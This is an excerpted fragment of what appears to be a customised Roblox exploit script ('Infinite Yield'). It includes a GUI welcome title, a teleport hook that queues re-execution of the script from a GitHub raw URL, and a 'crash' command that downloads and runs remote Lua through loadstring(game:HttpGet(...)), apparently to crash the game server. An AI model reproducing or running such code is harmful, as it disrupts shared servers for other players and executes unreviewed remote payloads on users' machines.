...
local playernamexd = game.Players.LocalPlayer.Name
Title.Name = "Title"
Title.Parent = Holder
Title.Active = true
...
Title.TextSize = 18
Title.Text = "Welcome, "..playernamexd
...
Players.LocalPlayer.OnTeleport:Connect(function(State)
	if State == Enum.TeleportState.Started then
		if KeepInfYield and queueteleport then
			queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Michaellitsxd/CUSOTM-IY/refs/heads/main/CUSTOM%20INFINITEYEILD.lua'))()")
		end
	end
end)
...
addcmd('crash',{'crashserver'},function(args, speaker)
	notify("Loading",'Hold on a sec')notify("Crashing...",'This could take a few seconds...')
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Michaellitsxd/gereegr/main/fingdong.lua'),true))()
end)
addcmd('fly2',{'f'},function(args, speaker)
	notify("Loading",'Hold on a sec')
